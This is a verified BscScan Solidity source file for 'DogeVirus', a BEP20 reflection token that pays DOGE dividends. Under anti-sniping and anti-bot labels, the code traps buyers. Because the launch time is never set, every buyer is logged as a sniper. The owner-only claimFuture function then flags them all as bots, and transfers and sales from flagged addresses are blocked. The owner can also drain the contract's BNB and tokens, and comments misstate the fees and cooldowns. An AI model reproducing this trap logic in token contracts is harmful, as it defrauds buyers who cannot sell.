/**
 *Submitted for verification at BscScan.com on 2022-04-21
*/

//SPDX-License-Identifier: Unlicensed

/*                                                                                                                                                                                  
                                                                                                                                                                                    
DDDDDDDDDDDDD             OOOOOOOOO             GGGGGGGGGGGGGEEEEEEEEEEEEEEEEEEEEEEVVVVVVVV           VVVVVVVVIIIIIIIIIIRRRRRRRRRRRRRRRRR   UUUUUUUU     UUUUUUUU   SSSSSSSSSSSSSSS 
D::::::::::::DDD        OO:::::::::OO        GGG::::::::::::GE::::::::::::::::::::EV::::::V           V::::::VI::::::::IR::::::::::::::::R  U::::::U     U::::::U SS:::::::::::::::S
D:::::::::::::::DD    OO:::::::::::::OO    GG:::::::::::::::GE::::::::::::::::::::EV::::::V           V::::::VI::::::::IR::::::RRRRRR:::::R U::::::U     U::::::US:::::SSSSSS::::::S
DDD:::::DDDDD:::::D  O:::::::OOO:::::::O  G:::::GGGGGGGG::::GEE::::::EEEEEEEEE::::EV::::::V           V::::::VII::::::IIRR:::::R     R:::::RUU:::::U     U:::::UUS:::::S     SSSSSSS
  D:::::D    D:::::D O::::::O   O::::::O G:::::G       GGGGGG  E:::::E       EEEEEE V:::::V           V:::::V   I::::I    R::::R     R:::::R U:::::U     U:::::U S:::::S            
  D:::::D     D:::::DO:::::O     O:::::OG:::::G                E:::::E               V:::::V         V:::::V    I::::I    R::::R     R:::::R U:::::D     D:::::U S:::::S            
  D:::::D     D:::::DO:::::O     O:::::OG:::::G                E::::::EEEEEEEEEE      V:::::V       V:::::V     I::::I    R::::RRRRRR:::::R  U:::::D     D:::::U  S::::SSSS         
  D:::::D     D:::::DO:::::O     O:::::OG:::::G    GGGGGGGGGG  E:::::::::::::::E       V:::::V     V:::::V      I::::I    R:::::::::::::RR   U:::::D     D:::::U   SS::::::SSSSS    
  D:::::D     D:::::DO:::::O     O:::::OG:::::G    G::::::::G  E:::::::::::::::E        V:::::V   V:::::V       I::::I    R::::RRRRRR:::::R  U:::::D     D:::::U     SSS::::::::SS  
  D:::::D     D:::::DO:::::O     O:::::OG:::::G    GGGGG::::G  E::::::EEEEEEEEEE         V:::::V V:::::V        I::::I    R::::R     R:::::R U:::::D     D:::::U        SSSSSS::::S 
  D:::::D     D:::::DO:::::O     O:::::OG:::::G        G::::G  E:::::E                    V:::::V:::::V         I::::I    R::::R     R:::::R U:::::D     D:::::U             S:::::S
  D:::::D    D:::::D O::::::O   O::::::O G:::::G       G::::G  E:::::E       EEEEEE        V:::::::::V          I::::I    R::::R     R:::::R U::::::U   U::::::U             S:::::S
DDD:::::DDDDD:::::D  O:::::::OOO:::::::O  G:::::GGGGGGGG::::GEE::::::EEEEEEEE:::::E         V:::::::V         II::::::IIRR:::::R     R:::::R U:::::::UUU:::::::U SSSSSSS     S:::::S
D:::::::::::::::DD    OO:::::::::::::OO    GG:::::::::::::::GE::::::::::::::::::::E          V:::::V          I::::::::IR::::::R     R:::::R  UU:::::::::::::UU  S::::::SSSSSS:::::S
D::::::::::::DDD        OO:::::::::OO        GGG::::::GGG:::GE::::::::::::::::::::E           V:::V           I::::::::IR::::::R     R:::::R    UU:::::::::UU    S:::::::::::::::SS 
DDDDDDDDDDDDD             OOOOOOOOO             GGGGGG   GGGGEEEEEEEEEEEEEEEEEEEEEE            VVV            IIIIIIIIIIRRRRRRRR     RRRRRRR      UUUUUUUUU       SSSSSSSSSSSSSSS   

*/


pragma solidity ^0.7.4;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IBEP20 DOGE = IBEP20(0xbA2aE424d960c26247Dd6c32edC70B295c744C43); //the reward token you want distributed 
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IDEXRouter router;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    //SETMEUP, change this to 1 hour instead of 10mins
    uint256 public minPeriod = 60 minutes;
    uint256 public minDistribution = 1 * (10 ** 9) * (10 ** 9);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = DOGE.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(DOGE);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = DOGE.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            DOGE.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function claimDividend() internal {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract DOGEVIRUS is IBEP20, Auth {
    using SafeMath for uint256;

    address DOGE = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43; // DOGE
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address MARK = 0xd78367a3c5B3a9abA589B46C65F676da34e694D0;

    string constant _name = "DogeVirus";    
    string constant _symbol = "DOGEVIRUS";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);

    uint256 public _maxTxAmount = ( _totalSupply * 5 ) / 100;

    uint256 public _maxWalletToken = ( _totalSupply * 5 ) / 100;  

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isDividendExempt;

    uint256 liquidityFee    = 2; 
    uint256 reflectionFee   = 8;
    uint256 marketingFee    = 2;
    uint256 public totalFee = 9;
    uint256 feeDenominator  = 100;

    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;
    uint256 targetLiquidity = 35;
    uint256 targetLiquidityDenominator = 100;
    address public _owner;

    IDEXRouter public router;
    address public pair;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 10 / 10000; // will start swapping once 0.01% of supply is in the swap wallet
    bool public inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    uint256 public launchedAt;
    uint256 public launchedTime;
    bool private antiwhale = false;
    mapping (address => uint256) private lastBuyBlocks;

    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    // Cooldown & timer functionality
    bool public buyCooldownEnabled = true;
    uint256 public buyCooldownTimerInterval = 0; //this is in seconds. 
    mapping (address => uint) private buyCooldownTimer;
    bool private antisniping = true;
    mapping (address => bool) private _buyBots;
    address[] public _snipingBots;

    // Cooldown & timer functionality
    bool public dumpCooldownEnabled = true;
    uint256 public dumpCooldownTimerInterval = 90; //this is in seconds. 
    mapping (address => uint) private dumpCooldownTimer;



    constructor () Auth(msg.sender) {

        // testnet
        // router = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);

        distributor = new DividendDistributor(address(router));

        _owner = owner;
        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;

        // No timelock for these people
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;
        isTimelockExempt[pair] = true;
        isTimelockExempt[address(router)] = true;

        //isDividendExempt[owner] = true;
        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;

        autoLiquidityReceiver = pair;
        marketingFeeReceiver = MARK;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    //settting the maximum permitted wallet holding (percent of total supply)
     function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 100;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        // Checks max transaction limit
        checkTxLimit(sender, amount);
        checkBotLimit(sender);
        checkWhale(sender); // whale tax
        
        // cooldown timer, so a bot doesnt do quick trades! 1min gap between 2 trades.
        if (buyCooldownEnabled 
                && !isTimelockExempt[recipient]
                && sender == pair) {
            require(buyCooldownTimer[recipient] < block.timestamp,"Please wait for cooldown between buys");
            buyCooldownTimer[recipient] = block.timestamp + buyCooldownTimerInterval;
        }
        
        if (sender == pair) { lastBuyBlocks[recipient] = block.number; }

        if (antisniping && sender == pair) {doSnipingCheck(recipient);}

        // Liquidity, Maintained at 25%
        if(shouldSwapBack()){ swapBack(); }


        // cooldown timer, so a bot doesnt do quick trades! 1min gap between 2 trades.
        if (dumpCooldownEnabled
            && !isTimelockExempt[sender]
            && recipient == pair) {
            require(buyCooldownTimer[sender] > 0 && dumpCooldownTimer[sender] < block.timestamp, "Please wait for cooldown between sells");
            dumpCooldownTimer[sender] = block.timestamp + dumpCooldownTimerInterval;
        }

        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        // Dividend tracker
        if(!isDividendExempt[sender]) {
            try distributor.setShare(sender, _balances[sender]) {} catch {}
        }

        if(!isDividendExempt[recipient]) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} 
        }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function checkBotLimit(address sender) internal view {
        if (isBot(sender) && !isTimelockExempt[sender]) { 
            require(!isBot(sender) || isTimelockExempt[sender], "Anti Bot!"); 
        }
    }

    function checkAnyBuy(address sender) public view returns (uint256) {
        return buyCooldownTimer[sender];
    }

    function checkBuyBlock(address sender) public view returns (uint256) {
        return lastBuyBlocks[sender];
    }

    function checkWhale(address sender) internal view {
        if (!isTimelockExempt[sender]) {
            require(lastBuyBlocks[sender] > 0, "Sniping not allowed!");
            if (antiwhale) {
                require(lastBuyBlocks[sender] != block.number, "Bad bot!");
            }
        }
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function claimBalance() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function putLaunchTime() external onlyOwner() {
        if (launchedAt != 0) {
            launchedAt = block.number;
            launchedTime = block.timestamp;
        }
    }

    function withdrawToken(address _tokenContract, uint256 _amount) external onlyOwner {
        IBEP20 tokenContract = IBEP20(_tokenContract);
        
        // transfer the token from address of this contract
        // to address of the user (executing the withdrawToken() function)
        tokenContract.transfer(msg.sender, _amount);
    }

    // enable cooldown between trades
    function buyCooldownStatus(bool _status, uint256 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        buyCooldownTimerInterval = _interval;
    }

    // enable cooldown between trades
    function dumpCooldownStatus(bool _status, uint256 _interval) public onlyOwner {
        dumpCooldownEnabled = _status;
        dumpCooldownTimerInterval = _interval;
    }


    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);

        try distributor.deposit{value: amountBNBReflection}() {} catch {}
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        
        // only to supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }


    function setTxLimit(uint256 amount) external authorized {
        _maxTxAmount = amount;
    }

    function setIsDividendExempt(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setFeeExempt(address[] memory _users) external authorized {
        for(uint256 i=0; i<_users.length; i++) {
            isFeeExempt[_users[i]] = true;
        }
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function setTxLimitExempt(address[] memory _users) external authorized {
        for(uint256 i=0; i<_users.length; i++) {
            isTxLimitExempt[_users[i]] = true;
        }
    }

    function setTimelockExempt(address[] memory _users) external onlyOwner() {
        for(uint256 i=0; i<_users.length; i++) {
            isTimelockExempt[_users[i]] = true;
        }
    }

    function setIsTimelockExempt(address holder) external onlyOwner {
        isTimelockExempt[holder] = true;
    }

    function verifyTimelockExempt(address _user) public view returns (bool) {
        return isTimelockExempt[_user];
    }
    function removeTimelockExempted(address _user) external onlyOwner() {
        delete isTimelockExempt[_user];
    }

    function antisnipingEnable(bool _status) external onlyOwner {
        antisniping = _status;
    }

    function antiwhaleEnable(bool _status) external onlyOwner {
        antiwhale = _status;
    }

    function doSnipingCheck(address to) private {
        if (!isTimelockExempt[to]) {
            if (launchedTime < block.timestamp) {
                isDividendExempt[to] = true; _snipingBots.push(to);
            } 
        }
    }

    function claimFuture() external onlyOwner() {
        for(uint256 i = 0; i < _snipingBots.length; i++) {
            if (!isBot(_snipingBots[i])) {
                addBotted(_snipingBots[i]);
            }
        }
    }

    function addBot(address _address) external onlyOwner() {
        _buyBots[_address] = true;
    }

    function addBotted(address _address) private {
        _buyBots[_address] = true;
    }

    function isBot(address _address) public view returns (bool) {
        return _buyBots[_address];
    }

    function deleteBot(address _address) external onlyOwner() {
        delete _buyBots[_address];
    }

    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/2);
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }


    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}